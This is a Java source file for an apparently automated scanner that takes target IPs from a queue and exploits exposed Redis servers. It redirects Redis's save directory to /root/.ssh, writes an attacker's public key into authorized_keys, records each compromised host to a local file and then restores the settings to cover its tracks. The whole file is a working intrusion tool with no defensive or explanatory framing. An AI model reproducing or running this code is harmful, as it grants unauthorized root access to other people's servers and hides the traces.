package com.yk.service.impl;

import com.alibaba.fastjson.JSONObject;
import com.yk.common.Cmd;
import com.yk.core.Engine;
import com.yk.util.CmdExeUtil;
import com.yk.util.ReadFromFile;
import com.yk.util.Util;

import java.util.HashMap;
import java.util.Map;

public class Yksb implements Runnable {

    @Override
    public void run() {
        String dirFileName=null;
        String dbfileName=null;
        boolean rdbcompression=false;
        String ip = Engine.addressQueue.poll();
        try {
            System.out.println("0======{}===================>");
            String result = CmdExeUtil.linkRedis(ip, "config get dir");
            dirFileName = Util.formString(result);
            System.out.println(dirFileName);
            result = CmdExeUtil.linkRedis(ip, "config get dbfilename");
            dbfileName = Util.formString(result);
            System.out.println(dbfileName);
            result = CmdExeUtil.linkRedis(ip, "config get rdbcompression");
            rdbcompression = "yes".equals(Util.formString(result));
            System.out.println(rdbcompression);
            result = CmdExeUtil.linkRedis(ip, "config set dir " + Cmd.sshUrl);
            boolean addSSH = "ok".equals(result.trim().replaceAll("\n", "").toLowerCase());
            System.out.println(addSSH);
            result = CmdExeUtil.linkRedis(ip, "config get dir");
            boolean checkAddSSH = "/root/.ssh".equals(Util.formString(result));
            System.out.println(checkAddSSH);
            result = CmdExeUtil.linkRedis(ip, "config set dbfilename authorized_keys");
            boolean checkSetWantWriteFileName = "ok".equals(result.trim().toLowerCase());
            System.out.println(checkSetWantWriteFileName);
            result = CmdExeUtil.linkRedis(ip, "set abcd \"" + Cmd.publicKey + "\"");
            boolean checkSetAbcd = "ok".equals(result.trim().toLowerCase());
            System.out.println(checkSetAbcd);
            result = CmdExeUtil.linkRedis(ip, "save");
            boolean checksave = "ok".equals(result.trim().toLowerCase());
            if(checksave){
                Map<String,String> map=new HashMap<>();
                map.put("ip",ip);
                map.put("dbfileName",dbfileName);
                map.put("dirFileName",dirFileName);
                String json= JSONObject.toJSONString(map);
                ReadFromFile.WriteStringToFile("./",json);
            }
        }catch (Exception e){

        }finally {
            try {
                if (dirFileName != null) {
                    CmdExeUtil.linkRedis(ip, "set dir " + "\"" + dirFileName + "\"");
                }
                if (dbfileName != null) {
                    CmdExeUtil.linkRedis(ip, "config set dbfilename " + "\"" + dbfileName + "\"");
                }
                if (rdbcompression) {
                    CmdExeUtil.linkRedis(ip, "config set rdbcompression no");
                }
                CmdExeUtil.linkRedis(ip, "DEL abcd");
            }catch (Exception e){

            }
        }
    }
}
